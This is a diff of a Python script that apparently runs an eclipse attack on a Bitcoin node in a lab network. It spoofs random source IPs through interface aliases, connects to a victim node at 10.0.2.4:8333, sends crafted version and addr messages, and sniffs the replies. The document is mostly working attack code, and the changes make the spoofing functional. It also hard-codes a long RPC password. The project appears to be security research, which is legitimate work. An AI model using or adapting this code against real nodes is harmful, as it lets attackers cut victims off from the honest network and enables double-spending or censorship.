@@ -14,44 +14,19 @@ from bitcoin.net import CAddress
 eclipse_packet_drop_rate = 0
 
 
-num_identities = 8
-network_interface = 'enp0s3'
+num_identities = 1
 
 victim_ip = '10.0.2.4'
 victim_port = 8333
 
 attacker_ip = '10.0.2.15'
-attacker_port = random.randint(1024,65535)
+attacker_port = random.randint(1024, 65535)
 
 spoof_IP_interface = []
 spoof_IP_and_ports = []
 spoof_IP_sockets = []
 
 iptables_file_path = f'{os.path.abspath(os.getcwd())}/backup.iptables.rules'
-
-# Get the network interface
-def get_interface():
-	m = re.search(r'\n[^ ]+ +[^ ]+ +[^ ]+ +[^ ]+ +([^ ]+)\n', terminal('arp'))
-	
-	if m != None:
-		return m.group(1)
-	else:
-		print "ERROR: Network interface couldn't be found."
-        sys.exit()
-
-
-ip_alias_network_interface = get_interface()
-
-def ip_alias(ip_address):
-	print(f'Setting up IP alias {ip_address}')
-	global alias_num
-	interface = f'{ip_alias_network_interface}:{alias_num}'
-	terminal(f'sudo ifconfig {interface} {ip_address} up')
-	alias_num += 1
-	return alias_num - 1
-
-def remove_ip_alias(interface, ip):
-	terminal(f'sudo ifconfig {interface} {ip_address} down')
 
 
 def terminal(cmd):
@@ -61,9 +36,35 @@ def terminal(cmd):
 def bitcoin(cmd):
 	return os.popen('./../../src/bitcoin-cli -rpcuser=cybersec -rpcpassword=kZIdeN4HjZ3fp9Lge4iezt0eJrbjSi8kuSuOHeUkEUbQVdf09JZXAAGwF3R5R2qQkPgoLloW91yTFuufo7CYxM2VPT7A5lYeTrodcLWWzMMwIrOKu7ZNiwkrKOQ95KGW8kIuL1slRVFXoFpGsXXTIA55V3iUYLckn8rj8MZHBpmdGQjLxakotkj83ZlSRx1aOJ4BFxdvDNz0WHk1i2OPgXL4nsd56Ph991eKNbXVJHtzqCXUbtDELVf4shFJXame -rpcport=8332 ' + cmd).read()
 
+# Get the network interface
+def get_interface():
+	m = re.search(r'\n_gateway +[^ ]+ +[^ ]+ +[^ ]+ +([^ ]+)\n', terminal('arp'))
+	
+	if m != None:
+		print(m.group(1))
+		return m.group(1)
+	else:
+		print('ERROR: Network interface couldn\'t be found.')
+		sys.exit()
+
+
+network_interface = get_interface()
+
+def ip_alias(ip_address):
+	print(f'Setting up IP alias {ip_address}')
+	global alias_num
+	interface = f'{network_interface}:{alias_num}'
+	terminal(f'sudo ifconfig {interface} {ip_address} up')
+	alias_num += 1
+	return interface
+
+def remove_ip_alias(interface, ip):
+	print(f'Removing IP alias {ip} on {interface}')
+	terminal(f'sudo ifconfig {interface} {ip} down')
+
 def random_ip():
-	return f'10.0.4.4'#{str(random.randint(0, 255))}'
-	#return '.'.join(map(str, (random.randint(0, 255) for _ in range(4))))
+	#return f'10.0.4.4'#{str(random.randint(0, 255))}'
+	return '.'.join(map(str, (random.randint(0, 255) for _ in range(4))))
 
 def version_packet(src_ip, dst_ip, src_port, dst_port):
 	msg = msg_version()
@@ -92,19 +93,19 @@ def addr_packet(str_addrs):
 
 def initialize_fake_connection(src_ip, dst_ip):
 	########## Skip changing to a random IP, just port :(
-	src_ip = attacker_ip
+	#src_ip = attacker_ip
 	##########
 	src_port = attacker_port
 	dst_port = victim_port
 	print(f'Spoofing with IP {src_ip}:{src_port} to IP {dst_ip}:{dst_port}')
 
-	print('Setting up IP alias...')
-	spoof_interface = spoof_IP()
-	print('Success')
+	spoof_interface = ip_alias(src_ip)
+	print(f'Successfully set up IP alias on interface {spoof_interface} (see ifconfig)')
 	print(terminal('ifconfig'))
 
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.bind(src_ip)
+	s.bind((src_ip, src_port))
+	print(f'Successfully binded {src_ip}:{src_port} to socket.')
 	s.connect((dst_ip, dst_port))
 
 	# Send version packet
@@ -245,21 +246,22 @@ if __name__ == '__main__':
 	#terminal('sudo ifconfig wlan0 up')
 
 	#time.sleep(10)
-	try:
-		start_new_thread(sniff, (), {
-			'iface':network_interface,
-			'prn':packet_received,
-			'filter':'tcp',
-			'store':1
-		})
-	except:
-		print('Error: unable to  start thread')
 
 	for i in range(1, num_identities + 1):
 		try:
 			initialize_fake_connection(src_ip = random_ip(), dst_ip = victim_ip)
 		except ConnectionRefusedError:
 			print('Connection was refused. The victim\'s node must not be running.')
+	for interface in spoof_IP_interface:
+		try:
+			start_new_thread(sniff, (), {
+				'iface':interface,
+				'prn':packet_received,
+				'filter':'tcp',
+				'store':1
+			})
+		except:
+			print('Error: unable to  start thread')
 	print(f'Successful connections: {len(spoof_IP_and_ports)}\n')
 
 
